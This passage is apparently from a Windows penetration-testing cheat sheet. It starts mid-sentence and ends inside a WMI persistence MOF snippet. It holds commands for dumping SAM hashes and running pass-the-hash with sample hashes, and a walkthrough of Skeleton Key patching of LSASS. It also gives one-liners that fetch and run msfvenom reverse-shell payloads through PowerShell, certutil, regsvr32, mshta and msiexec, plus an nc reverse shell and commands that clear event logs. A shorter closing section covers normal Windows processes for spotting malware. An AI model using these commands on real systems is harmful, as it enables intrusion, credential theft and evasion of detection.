credentials. Usable with \"runas /savecred\" cmdkey / list LM hashes Password longer than 7 is split and each half hashed separately Passwords are converted into uppercase No salt Empty LM hash AAD3B435B51404EE aad3b435b51404ee AAD3B435B51404EEAAD3B435B51404EE aad3b435b51404eeaad3b435b51404ee NTLM hashes Administrator : 500 : aad3b435b51404eeaad3b435b51404ee : 8118 cb8789b3a147c790db402b016a08 ::: ( UID ):( UID NUM ):( LM HASH ):( NT HASH ):( COMMENT ):( USER HOME PATH ): Dumping hashes Cannot copy SAM when sys is in use C : \\ reg . exe save hklm \\ sam sam C : \\ reg . exe save hklm \\ security security C : \\ reg . exe save hklm \\ system system Use secretsdump.py to extract Capturing Hashes Inveigh Impacket's smbserver.py RDP Password Brute-forcing: ncrack - v - f --user administrator -P password.txt rdp://ip,CL=1 Attack Patterns Pass the Hash Auth using username and NTLM hash (since NTLM and LM hashes are not salted) Replace \"no password\" in dump wih empty LM hash Copy admins dumped hash (LM:NTML) export SMBHASH = LM : NTML pth - winexe - U administrator % // ip cmd pth-winexe pth - winexe - U jeeves / Administrator % aad3b435b51404eeaad3b435b51404ee : e0fb1fb85756c24235ff238cbe81fe00 // 10 . 10 . 10 . 63 cmd LSASS DPAPI Backup Key Access to secret keys of all users in a domain (certificate, private key, etc.) Obtaining the never changing DPAPI master key In a domain setup, all master keys are required to decrypt the keys. All master keys are protected using one never renewed key. Backup key protocol can be used (tz) to get this key from DC. Skeleton Key https://www.secureworks.com/research/skeleton-key-malware-analysis Actors can use a password of their choosing to authenticate as any user. Skeleton Key is deployed as an in-memory patch on a victim's AD domain controllers to allow the threat actor to authenticate as any user, while legitimate users can continue to authenticate as normal. When run, Skeleton Key performs the following tasks: Check for one of the following compatible 64-bit Windows versions. The malware is not compatible with 32-bit Windows versions or with Windows Server versions beginning with Windows Server 2012 (6.2). 6.1 (Windows 2008 R2) 6.0 (Windows Server 2008) 5.2 (Windows 2003 R2) Use the SeDebugPrivilege function to acquire the necessary administrator privileges to write to the Local Security Authority Subsystem Service (LSASS) process. This process controls security functions for the AD domain, including user account authentication. Enumerate available processes to acquire a handle to the LSASS process. Obtain addresses for the authentication-related functions that will be patched: CDLocateCSystem \u2014 located in cryptdll.dll SamIRetrieveMultiplePrimaryCredentials \u2014 located in samsrv.dll SamIRetrievePrimaryCredentials \u2014 located in samsrv.dll Perform OS-specific adjustments using the global variable set during the compatibility check in Step 1. Use the OpenProcess function to acquire a handle to the LSASS process. Reserve and allocate the required memory space to edit and patch the LSASS process's memory. Patch relevant functions based on the operating system: CDLocateCSystem (all compatible Windows versions) SamIRetrieveMultiplePrimaryCredentials (only Windows 2008 R2 (6.1)) SamIRetrievePrimaryCredentials (all compatible Windows versions other than Windows 2008 R2 (6.1)) Skeleton Key performs the following steps to patch each function: Call the VirtualProtectEx function to change the memory protection to allow writing to the required memory allocations (PAGE_EXECUTE_READWRITE, 0x40). This step allows the function's code to be updated in memory. Call the WriteProcessMemory function to change the address of the target function to point to the patched code. This change causes calls to the target function to use the patch instead. Restore the original memory protection by calling VirtualProtectEx with the original memory protection flags. This step is likely to avoid suspicious writable and executable memory allocations. Manipulating SID sidHistory can be used to manipulate SID and become domain admin Use SID of the DC to look ad domain admin Use DCSync to get more information Windows Version Dependent Information Windows 2000 LSASS contains Plain NTLM / LM hashes Kerberos keys, tickets, session keys, passwords (if not consumed already) Passwords encrypted in memory using 1 byte key (XOR) Key is stored in a secret structure [Tool] MimiLove (not in Mimikatz ) Windows XP/2003 WDigest provider to auth to Web/SASL/LDAP - RFC2617 Password constantly stays in memory LSA SSO secrets protected by LsaEncryptMemory and unencrypted by LsaUnprotectMemory RC4 DESx Key and IV are stored near the secret in LSASS process TsPks (CredSSP) provider can be added manually in XP Terminal server single sign on Credential delegation for terminal server/PowerShell/Double hop, etc. LiveSSP - For using live account to logon to windows Windows Vista/7 TsPkg (CredSSP support) is available by default Several passwords are constantly in memory LSA SSO secrets protected by LsaEncryptMemory and unencrypted by LsaUnprotectMemory 3DES AES Key and IV are stored near the secret in LSASS process Windows 8/8.1 Clear text domain passwords in Vault When using PIN, Picture or Fingerprint to authenticate Offline access is possible Pass the hash, over pass the hash and pass the ticket for RDP Windows 8.1 WDigest is off by default. No password in memory by default. LSA login session cache cleaner Restricted admin mode for RDP Avoid credentials from getting sent to server Pass the hash, over pass the hash and pass the ticket for RDP (with CredSSP) LSA protection LSASS is a protected process. No memory access provided. Can be bypassed by: A driver Another protected process Protected Users security group No NTLM, WDigest, CredSSP, delegation or SSO Strengthen eKerberos only KB2975625 - Restricted admin is disabled by default Windows 10 VMS introduce for enterprise users Use Crypto HSM approach When Windows Credential Guard is enabled: NTLM hash of the password stored in the memory in \"secure world\", encrypted with a \"session-key\". User will get a blob. When authenticating, user sends the blob with NTLM challenge. Secure world will do the hashing operation and create the NTML challenge response and send the response to the normal world. In Kerberos, process is same (secure-world maintain more keys) Limitations TGS session key is not protected (TGT is protected) Not available in VMs and not enabled by default More to protect: DPAPI SAM / DSRM PAC signature References Extracting User Password Data with Mimikatz DCSync: https://blog.stealthbits.com/extracting-user-password-data-with-mimikatz-dcsync/ Using Credentials References https://blog.ropnop.com/using-credentials-to-own-windows-boxes/ Password Spraying auxiliary / scanner / smb / smb_login Send the same credentials to all hosts listening on 445 - msf auxiliary ( smb_login ) services - p 445 - R Can do same with CrackMapExec for a subnet: https://github.com/byt3bl33d3r/CrackMapExec Can use following command to explore: net use \\\\ machine - name / user : username @domainname passwords dir \\\\ machine - name \\ c $ net use Can be detected by using net session Can terminate all session with net use / delete * Some commands, such as net view use the login user-name. .: use runas runas / netonly / user : user @domainname cmd.exe net view \\\\ machine - name / all Verify it uses Kerberos by klist Get shells psexec PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software auxiliary / admin / smb / psexec auxiliary / admin / smb / psexec_comman psexec.py - https://github.com/CoreSecurity/impacket / opt / impacket / examples / psexec . py - hashes aad3b435b51404eeaad3b435b51404ee : 9 e730375b7cbcebf74ae46481e07b0c7 - target - ip 10 . 10 . 10 . 10 \\\\ machinename - u user @domainname - p password cmd . exe - s to get SYSTEM shell Use runas to use Kerberos TGT and avoid giving password: runas / netonly / user : user @domainname PsExec . exe \\\\ machinename - u user @domainname cmd . exe Manual Operation Copy a binary to the ADMIN$ share over SMB ( C : \\ Windows \\ PSEXECSVC . exe . ) - copy example . exe \\\\ machine \\ ADMIN $ Create a service on the remote matching pointing to the binary - sc \\\\ machine create serviceName binPath = c:\\Windows\\example.exe Remotely start the service - sc \\\\ machine start serviceName When exited, stop the service and delete the binary - del \\\\ machine \\ ADMIN $\\ example . exe smbexec.pp Stealthier (does not drop a binary) Creates a service Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe) Echos the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it. Creates a log entry for each command. Use Metasploit web_delivery to send script sc \\\\ machine create serviceName binPath = powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring( http://10.9.122.8:8080/AZPLhG9txdFhS9n ); sc \\\\ machine start serviceName Winexe https://sourceforge.net/projects/winexe/ winexe - U Administrator // 10 . 10 . 10 . 82 cmd . exe Pass the hash pth - winexe - U jeeves / Administrator % aad3b435b51404eeaad3b435b51404ee : e0fb1fb85756c24235ff238cbe81fe00 // 10 . 10 . 10 . 63 cmd wmiexec.py Windows Management Instrumentation (WMI) to launch a semi-interactive shell. WMI is the infrastructure for management data and operations on Windows (like SNMP). without touching disk or creating a new service. wmiexec . py administrator : password @10.10.10.10 wmic wmic computerystem list full / format : list wmic process list / format : list wmic ntdomain list / format : list wmic useraccount list / format : list wmic group list / format : list wmic sysaccount list / format : list - https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/Useful-WMIC-Queries/ba-p/375023 - https://windowstech.net/wmic-commands/ - Can query remotely. - Logging for WMI events is disabled by default: https://msdn.microsoft.com/en-us/library/windows/desktop/aa826686(v=vs.85).aspx wmic wmic / node : machinename / user : username computerystem list full / format : list - Local admins on a remote machine wmic / node : ordws01 path win32_groupuser where ( groupcomponent = win32_group.name=\\ administrators \\ ,domain=\\ ORDWS01 \\ ) - Who is logged-in: wmic / node : ordws01 path win32_loggedonuser get antecedent - Read nodes from text file: wmic / node : @workstations . txt path win32_loggedonuser get antecedent - Execute command: powershell . exe - NoP - sta - NonI - W Hidden - Enc JABXAEMAPQBOAEUAVwAtAE8AQgBKAGUAQw ... truncated ... wmic / node : ordws01 / user : CSCOU \\ jarrieta path win32_process call create **empire launcher string here** - Used in: - https://github.com/samratashok/nishang - https://github.com/PowerShellMafia/PowerSploit - CrackMapExec - wmiexec.py - wmis pth-wmis pth-wmis doesn\u2019t work on 64 bit Kali, however, pth-wmic works with no issues and apparently this has been a problem since 2013. After downloading the 32 bit version of pth-wmis and the required libraries, we are back up and running. echo iex (New-Object Net.WebClient).DownloadString( http://172.16.67.128:80/6WcepYO ) | iconv --to-code UTF-16LE | base64 -w 0 kaliwmis - 32 - U administrator % badpassword // 10 . 10 . 10 . 10 cmd.exe /c powershell.exe -nop -enc base64-value Windows Remote Management (WinRM) 5985/tcp (HTTP) / 5986/tcp (HTTPS) Allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilizing WMI. Enable: Enable - PSRemoting - Force Set - Item wsman : \\ localhost \\ client \\ trustedhosts * Test if target is configured for WinRM: Test - WSMan machinename Execute command: Invoke - Command - Computer ordws01 - ScriptBlock { ipconfig / all } - credential CSCOU \\ jarrieta - Command line: Enter - PSSession - Computer ordws01 - credential CSCOU \\ jarrieta Force enabling WinRM: PS C : \\ tools \\ SysinternalsSuite . \\ PsExec . exe \\\\ ordws04 - u cscou \\ jarrieta - p nastyCutt3r - h - d powershell . exe enable-psremoting -force CrackMapExec \"-x\" parameter to send commands. wmiexec.py across multiple IPs Using Remote Desktop Impacket's rdp_check to see if you have RDP access, Then use Kali's rdesktop to connect: Invoke command with credentials $ user = .\\administrator ; $ psw = 1234test ; $ secpsw = ConvertTo - SecureString $ psw - AsPlainText - Force ; $ credential = New - Object System . Management . Automation . PSCredential $ user , $ secpsw invoke-command -computername localhost -credential $ credential -scriptblock { cd C : \\ Users \\ Administrator \\ Desktop \\ ; C : \\ Users \\ Administrator \\ Desktop \\ root . exe } General Exploits Post Exploitation Patch level systeminfo wmic qfe get Caption , Description , HotFixID , InstalledOn User info whoami echo % USERNAME % net user net localgroup net user / domain net group / domain net group / domain Group Name Firewall netsh firewall show state netsh firewall show config Network ipconfig / all route print arp - A Scheduled Tasks schtasks / query / fo LIST / v --copy output and save in txt cat schtask . txt | grep SYSTEM\\|Task To Run | grep - B 1 SYSTEM dir % SystemRoot % \\ Tasks e.g. c:\\windows\\tasks e.g. c:\\windows\\system32\\tasks Services Check service config can be modify or not accesschk.exe /accepteula accesschk.exe -uwcqv Authenticated Users * /accepteula accesschk.exe -ucqv \\ Service Name sc qc \\ Service Name -- Get service details Check service with weak file permission for /f tokens=2 delims= = %a in ( wmic service list full^|find /i pathname ^|find /i /v system32 ) do @echo % a c:\\windows\\temp\\permissions.txt for /f eol ^=^ ^ delims ^=^ %a in (c:\\windows\\temp\\permissions.txt ) do cmd.exe /c icacls %a sc.exe sc query state= all | findstr SERVICE_NAME: Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo % i type Servicenames.txt FOR /F tokens=2 delims= %i in (Servicenames.txt) DO @echo % i services.txt FOR /F %i in (services.txt) DO @sc qc % i | findstr BINARY_PATH_NAME path.txt Unquoted Service Path wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v c:\\windows\\\\ | findstr /i /v sc query sc qc service name AlwaysInstallElevated IF 64 bits use: %SystemRoot%\\Sysnative\\reg.exe reg query HKLM \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer \\ AlwaysInstallElevated reg query HKCU \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer \\ AlwaysInstallElevated Service only available from inside netstat - ano upload plink . exe plink . exe - R remote port : 127.0.0.1 : local port root @ ipaddress Passwords in files/registry https://pentestlab.blog/tag/privilege-escalation/page/3/ cmdkey / list If there are entries, it means that we may able to runas certain user who stored his cred in windows runas / savecred / user : ACCESS \\ Administrator c:\\windows\\system32\\cmd.exe /c \\\\IP\\share\\nc.exe -nv 10.10.14.2 80 -e cmd.exe SAM file %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system Find findstr / si password * . txt findstr / si password * . xml findstr / si password * . ini findstr / si pass / pwd * . ini dir / s * pass * == * cred * == * vnc * == * . config * findstr / spin password * . * findstr / spin password * . * Specific credential files: Unattended ? vnc ? c : \\ sysprep . inf c : \\ sysprep \\ sysprep . xml c : \\ unattend . xml % WINDIR % \\ Panther \\ Unattend \\ Unattended . xml % WINDIR % \\ Panther \\ Unattended . xml dir / b / s unattend . xml dir / b / s web . config dir / b / s sysprep . inf dir / b / s sysprep . xml dir / b / s * pass * dir c : \\ * vnc . ini / s / b dir c : \\ * ultravnc . ini / s / b dir c : \\ / s / b | findstr / si * vnc . ini VNC reg query HKCU\\Software\\ORL\\WinVNC3\\Password reg query HKCU\\Software\\TightVNC\\Server Windows autologin reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2 nul | findstr DefaultUserName DefaultDomainName DefaultPassword SNMP Paramters: reg query HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP Putty: reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions Search for password in registry reg query HKLM / f password / t REG_SZ / s reg query HKCU / f password / t REG_SZ / s Important Files Collections Windows EXE / DLL files: http://www.saule-spb.ru/touch/windows_files.html Living Off The Land Binaries and Scripts: https://lolbas-project.github.io/ https://github.com/LOLBAS-Project/LOLBAS https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows During LFI: %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\repair\\SAM %WINDIR%\\win.ini %SYSTEMDRIVE%\\boot.ini %WINDIR%\\Panther\\sysprep.inf %WINDIR%\\system32\\config\\AppEvent.Evt Version information sysinfo Windows 7+: / windows / system32 / license . rtf / windows / system32 / eula . txt Updates: Update information: WindowsUpdate . log Update Download locations: C : \\ Windows \\ SoftwareDistribution \\ Download wbadmin / ntbackup https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin Perform backups and restores of operating systems, drive volumes, computer files, folders, and applications from a command-line interface. Delete any recovery catalogs: cmd . exe / c wbadmin . exe delete catalog - quiet BCDEdit https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options Tool for managing Boot Configuration Data (BCD). BCD files provide a store that is used to describe boot applications and boot application settings. Usable to creating new stores, modifying existing stores, adding boot menu options, and so on. Windows recovery console does not attempt to repair anything: cmd . exe / c bcdedit . exe / set { default } bootstatuspolicy ignoreallfailures bcdedit / set { default } recoveryenabled no wevtutil https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs. Clear System and Security logs: cmd . exe / c wevtutil . exe cl System cmd . exe / c wevtutil . exe cl Security DUMPBIN https://docs.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=vs-2017 Displays information about Common Object File Format (COFF) binary files. You can use DUMPBIN to examine COFF object files, standard libraries of COFF objects, executable files, and dynamic-link libraries (DLLs). HTA Application where source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. An HTA executes without the constraints of the internet browser security model; it executes as a \"fully trusted\" application. Mshta.exe (HTA) Running HTA( HTML Application) files use exploit / windows / misc / hta_server msf exploit ( windows / misc / hta_server ) set srvhost 192 . 168 . 1 . 109 msf exploit ( windows / misc / hta_server ) set lhost 192 . 168 . 1 . 109 msf exploit ( windows / misc / hta_server ) exploit mshta . exe http : // 192 . 168 . 1 . 109 : 8080 / 5 EEiDSd70ET0k . hta Rundll32.exe Invoke a function exported from a DLL use exploit / windows / smb / smb_delivery msf exploit ( windows / smb / smb_delivery ) set srvhost 192 . 168 . 1 . 109 msf exploit ( windows / smb / smb_delivery ) exploit rundll32 . exe \\\\ 192 . 168 . 1 . 109 \\ vabFG \\ test . dll , 0 Regsvr32.exe Register and unregister OLE controls, such as DLLs and ActiveX controls in the Windows Registry installed in the %systemroot%\\System32 Windows XP and later Regsvr32 uses \u201csquiblydoo\u201d technique for bypassing application whitelisting Execute Script Via regsvr32.exe https://gist.github.com/coh7eiqu8thaBu/809f49aa24ace2b9f326ab419f7b124a Squiblydoo utilizes the binary regsvr32.exe to download an XML file that contains scriptlets for executing code: https://www.carbonblack.com/blog/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/ Able to request a .sct file and then execute the included PowerShell command inside Syntax : Regsvr32 [ / s ][ / u ] [ / n ] [ / i [: cmdline ]] dllname / u \u2013 Unregister server / i \u2013 Call DllInstall passing it an optional [ cmdline ] ; when it is used with /u, it calls dll to uninstall / n \u2013 do not call DllRegisterServer ; this option must be used with /i / s \u2013 Silent ; display no message boxes use exploit / multi / script / web_delivery msf exploit ( web_delivery ) set target 3 msf exploit ( web_delivery ) set payload windows / meterpreter / reverse_tcp msf exploit ( web_delivery ) set lhost 192 . 168 . 1 . 109 msf exploit ( web_delivery ) set srvhost 192 . 168 . 1 . 109 msf exploit ( web_delivery ) exploit regsvr32 / s / n / u / i : http : // 192 . 168 . 1 . 109 : 8080 / xo31Jt5dIF . sct scrobj . dll Certutil.exe msfvenom - p windows / meterpreter / reverse_tcp lhost = 192 . 168 . 1 . 109 lport = 1234 - f exe shell . exe certutil . exe - urlcache - split - f http : // 192 . 168 . 1 . 109 / shell . exe shell . exe shell . exe Powershell.exe git clone https :// github . com / besimorhino / powercat . git python -m SimpleHTTPServer 80 powershell -c IEX(New-Object System.Net.WebClient).DownloadString( http://192.168.1.109/powercat.ps1 );powercat -c 192.168.1.109 -p 1234 -e cmd Batch Files msfvenom - p cmd / windows / reverse_powershell lhost = 192 . 168 . 1 . 109 lport = 4444 1 . bat powershell - c IEX (( New - Object System . Net . WebClient ). DownloadString ( http://192.168.1.109/1.bat )) Cscript msfvenom -p cmd / windows / reverse_powershell lhost = 192 . 168 . 1 . 109 lport = 1234 -f vbs 1 . vbs script . exe test.vbs powershell . exe -c (New-Object System.NET.WebClient).DownloadFile( http://192.168.1.109/1.vbs ,\\ $env:temp\\test.vbs\\ );Start-Process %windir%\\system32\\cscript.exe \\ $env:temp\\test.vbs\\ Msiexec.exe Install MSI packages msfvenom - p windows / meterpreter / reverse_tcp lhost = 192 . 168 . 1 . 109 lport = 1234 - f msi 1 . msi msiexec / q / i http : // 192 . 168 . 1 . 109 / 1 . msi Wmic.exe WMI command-line interface that is used for a variety of administrative functions for local and remote machine can invoke XSL script (eXtensible Stylesheet Language) koadic: use stager / js / wmic set SRVHOST 192 . 168 . 1 . 107 run wmic os get / FORMAT : http://192.168.1.107:9996/g8gkv.xsl Prefetch Files Created AT.EXE (scheduled jobs/tasks) SCHTASKS.EXE (scheduled jobs/tasks) CMD.EXE (Obviously common, but I included it anyway. Especially if the prefetch hash doesn't match the legitimate ones. ) NET.EXE (net view, etc.) NET1.EXE (net use) NETSTAT.EXE (netstat -ano) REG.EXE (reg query and reg add) SC.EXE (interact with services) SYSTEMINFO.EXE (system profiling) TASKKILL.EXE (kill running processes) TASKLIST.EXE (tasklist /v) POWERSHELL.EXE (interact with powershell) NBTSTAT.EXE (profile) XCOPY.EXE (copy files around) NSLOOKUP.EXE (profile) QUSER.EXE (profile) RAR.EXE (Exfil or Tool dropping) * And other archive utilities (Ex. 7zip) PING.EXE (check connectivity) FTP.EXE (download/upload) Various Sysinternal tools (Psexec, sdelete, etc.) BITSADMIN.EXE (download/upload) ROUTE.EXE (adding persistent routes) REGSVR32.EXE (services) MAKECAB.EXE (compression before exfil) Originally form: http://www.sysforensics.org/2014/01/lateral-movement/ . Link is no longer working Runonce.exe, msdt.exe, Openwith.exe https://medium.com/@mattharr0ey/lolbas-blowing-in-the-binaries-path-c480176cc636 sethc.exe (Sticky keys) By replacing the \u201cSticky Keys\u201d binary, C:\\Windows\\System32\\sethc.exe, with the Windows Command Processor cmd.exe, the attackers then accessed a privileged Windows console session without authenticating to the system. \u201cSticky Keys\u201d is an accessibility feature that allows users to activate Windows modifier keys without pressing more than one key at a time. Pressing the shift key five times activates \u201cSticky Keys\u201d and executes sethc.exe, which, when replaced with cmd.exe, opens a System-level command shell. From this shell, the attackers can execute arbitrary Windows commands, including adding or modifying accounts on the system, even from the logon screen (pre-authentication). Base64 encode / decode certutil - encode inputfile outputfile certutil - decode inputfile outputfile mpengine . dll (+ mpasbase.vdm mpasdlta.vdm mpavbase.vdm mpavdlta.vdm) Windows Defender - Microsoft Malware Protection Engine Take buffer of data and decide of malicious or not MPSigStub . exe Microsoft Malware Protection Signatuee Update Stub Special File Handling Important Processes Checklist - Simple checklist to review while looking for malicious/suspect process activity. Check the parent/child relationships of processes. Check which users names the processes are running under Check their command line parameters for those processes that use them. Check their digital signatures Check their base priorities Check the location they are being from Check their spellings Leverage memory analysis to detect hidden and/or injected process. Some malware can hide processes by unlinking them (among other ways). Memory analysis is a must these days. When you get comfortable with everything here, dig deeper and check what modules are typically loaded for each process. Check and see if processes that should not be connecting out to the internet are not Check process privileges If wscript.exe process is running check the command line of what it is running. Investigate processes running inside %temp%, root of %appdata%, %localappdata%, recycle bin, etc. If rundll32.exe is running check its command line as well. \"Most\" legitimate user applications like Adobe, Web browsers, etc. don't spawn child processes like cmd.exe. If you see this, they should be investigated. Core Windows processes shouldn't be communicating out to the internet. If you see communication from these processes, dig deeper. Look for suspicious URLs/IPs, check process strings, etc. References http://sysforensics.org/2014/01/know-your-windows-processes . Link is not longer working. https://web.archive.org/web/20151113022252/http://blogs.sans.org/windows-security/files/Process_Hacker_SANS_Jason_Fossen.pdf Idle and System Created by ntoskrnl.exe via the process manager function, which creates and terminates processes and threads. No visible parent processes System has a static PID of 4 System creates smss.exe There should only be one system process running SMSS - Session Manager First user mode process Parent process is System Base Priority of 11 Username: NT AUTHORITY\\SYSTEM Performs delayed file delete/rename changes Loads known dlls Runs from %systemroot%\\System32\\smss.exe Creates session 0 (OS services) Creates session 1 (User session) Creates csrss and winlogon then exits, which is why they have no parent process and they both have session ids of 1 Runs within session 0 Only one smss.exe process should be running at one time. The second smss.exe process exits, so you will only see the one running in session 0. There can be more sessions if more users are logged on to the system. 0 and 1 are for a single user logged onto the system. CSRSS.EXE - Client/Server Run Windows subsystem process. Base Priority of 13 %SystemRoot%\\system32\\csrss.exe Username: NT AUTHORITY\\SYSTEM Creates/Deletes processes and threads, Temp files, etc. In XP its used to draw text based console windows. Under Windows 7, the conhost process now does that functionality. For example, cmd.exe One csrss process per session Its name is often used by malware to hide on systems (CSSRS.EXE, CSRSSS.EXE, etc.) Runs within session 0 WININIT.EXE - Windows Initialization Process Parent to services.exe (SCM), lsass.exe and lsm.exe Created by smss.exe, but since smss.exe exits there is no parent to WININIT. Base Priority of 13 Username: NT AUTHORITY\\SYSTEM %SystemRoot%\\system32\\wininit.exe Performs user-mode initialization tasks Creates %windir%\\temp Runs within session 0 SERVICES.EXE - Service Control Manager Child to WININIT.EXE Parent to services such at svchost.exe, dllhost.exe, taskhost.exe, spoolsv.exe, etc. Services are defined in SYSTEM\\CurrentControlSet\\Services %SystemRoot%\\System32\\wininit.exe Username: NT AUTHORITY\\SYSTEM Base Priority of 9 Loads a database of services into memory Runs within session 0 There should only be one services.exe process running LSASS.EXE - Local Security Authority Child to WININIT.EXE Only one lsass.exe process %SystemRoot%\\System32\\lsass.exe Responsible for local security policy to include managing users allowed to login, password policies, writing to the security event log, etc. Often targeted by malware as a means to dump passwords. Also mimicked by malware to hide on a system (lass.exe, lssass.exe, lsasss.exe, etc.). These \"fake\" names will not be a children of wininit.exe. Base Priority of 9 Username: NT AUTHORITY\\SYSTEM Runs within session 0 It should not have child processes SVCHOST.EXE - Service Hosting Process Multiple instances of svchost.exe can/do exist/run %SystemRoot%\\System32\\svchost.exe Username: Should only be one of three options: NT AUTHORITY\\SYSTEM, LOCAL SERVICE, or NETWORK SERVICE Should always have a parent of services.exe Base Priority of 8 Often mimicked (scvhost, svch0st, etc.) When they are mimicked they will not be running as children to services.exe. Command Line: svchost.exe -k -k values should exist within the Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost registry key Often times when malware uses the actual svchost.exe to load their malicious service they will not include -k command line parameters and be running under a username that does not match on of the three listed in bullet 3. They should all be running within session 0 LSM.EXE - Load Session Manager Service Manages the state of terminal server sessions on the local machine. Sends the requests to smss.exe to start new sessions. Child to wininit.exe It should not have child processes Receives logon/off, shell start and termination, connect/disconnects from a session, and lock/unlock desktop I have not personally seen malware try and impersonate LSM.exe, but there is always a first so keep your eyes open. %systemroot%\\System32\\lsm.exe Base Priority of 8 Username: NT AUTHORITY\\SYSTEM Runs within session 0 WINLOGON.EXE - Windows Logon Process No parent process Could have a child process of LogonUI if smartcard, etc. are used to authenticate LogonUI will terminate once the user enters their password. Once password is entered the verification is sent over to LSASS and it's verified via Active Directory or SAM (the registry hive SAM), which stores local users and group information. Base Priority of 13 Runs within session one Handles interactive user logons/logoffs when SAS keystroke combination is entered (Ctrl+Alt+Delete) Loads Userinit within Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon The userinit value in the registry should be: Userinit.exe, (note the comma). Malware will sometimes add additional values to this key, which will load malware upon successful logons. Userinit.exe exits once it runs so you wont see this process running when you look. Userinit initializes the user environment. This includes running GPOs and logon scripts. Will run Shell value located at Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon within the registry. The value of shell should be Explorer.exe. Malware will also use this sometimes to execute malware by adding values. Since Userinit exists this is also why Explorer.exe doesn't have a parent process. Explorer.exe - AKA Windows Explorer No parent process since Userinit.exe exits The value \"Explorer.exe\" is stored in shell value within the registry. The registry location is here: Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell Base Priority of 8 Username: The logged on user account. %Systemroot%\\Explorer.exe This will contain multiple child processes. Some of you might know this better as, \"Windows Explorer\" This process is often targeted by malware. Malware will often times inject this process. One indication of this is if Explorer.exe is connecting out to the internet. There are other indicators, but that's another post. We are keeping it simple here. Windows API https://en.wikipedia.org/wiki/Windows_API#Versions Using Python on Windows: https://docs.python.org/3/using/windows.html theForger's Win32 API Programming Tutorial: http://www.winprog.org/tutorial/ Windows API Reference: https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN Network Related ARP Table: GetIPNetTable Services Change Services: ChangeServiceConfigW WMI Implementation of Common Information Model ( CIM ) and Web - Based Enterprise Management ( WBEM ) WBEM standard encompasses the design of an extensible enterprise data-collection and data-management facility that has the flexibility and extensibility required to manage local and remote systems that comprise arbitrary components WMI consists of four main components: management applications WMI infrastructure providers managed objects (system, disks, processes, network components...) Allows Execute some code when the notification of an event http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf CIM classes hierarchically organized with subclasses grouped in namespaces (logical group of classes) root\\cimv2 includes most of the classes that represent computer's resources Categories Core Classes - Applies to all areas of management (__System_Security) Common Classes - Extension of core classes (CIM_UnitaryComputerSystem) Extended Classes - Technology specific addition to common classes (Win32_ComputerSystem) Types Abstract - Template classes used to define other classes. Static - Stores data WMI configuration Operational data Dynamic - Retrieved from a provider, and represents managed resource (process, service, file, etc.) Association - Describe relationship between classes or resources. WMI Provider Bridge between managed object and WMI Provide access to classes Namespaces CIM classes are decided logically using namespaces For easier discovery and use root \\ cimv2 root \\ default root \\ security root \\ subscription WMI repository - stores CIM classes' definitions %SystemRoot%\\System32\\wbem\\Repository Interesting CIM classes - __EventFilter [ create ]: permits to define a Windows event - __EventConsumer : (abstract consumer class) - ActiveScriptEventConsumer : possible to embed VBScript or JSScript in the consumer (only available in root \\ subscription ) - Consumer runs with SYSTEM privilege on Windows XP and Windows 2003 Server - Vista , it is running under the LOCAL_SERVICE user - __FilterToConsumerBinding : link two other instances. (permits to activate the consumer - and to execute its code - whenever the defined event occurs) MOF (Managed Object Format) Language used to describe CIM classes, namespaces and providers MOF file needs to be registered into the CIM/WMI repository in order to be taken into account by WMI CIM class(es) MOF describes are added into the repository Stored in %SystemRoot%\\System32\\wbem Compilation Compiled using mofcomp . exe Auto compile register Writable to Administrator only Files added to %SystemRoot%\\System32\\wbem\\mof\\ get auto compiled and registered (before Vista) Logs are in %SystemRoot%\\System32\\wbem\\mof\\Logs\\mofcomp.log Wait for a windows event and trigger: #pragma namespace ( \\\\\\\\.\\\\root\\\\subscription ) instance of __EventFilter as $FILTER { Name = CLASS_FIRST_TEST ; EventNamespace = root\\\\cimv2 ; Query = SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA \\ Win32_NTLogEvent \\ AND TargetInstance.LogFile=\\ Application \\ ; QueryLanguage = WQL ; }; instance of ActiveScriptEventConsumer as $CONSUMER { Name = CLASS_FIRST_TEST 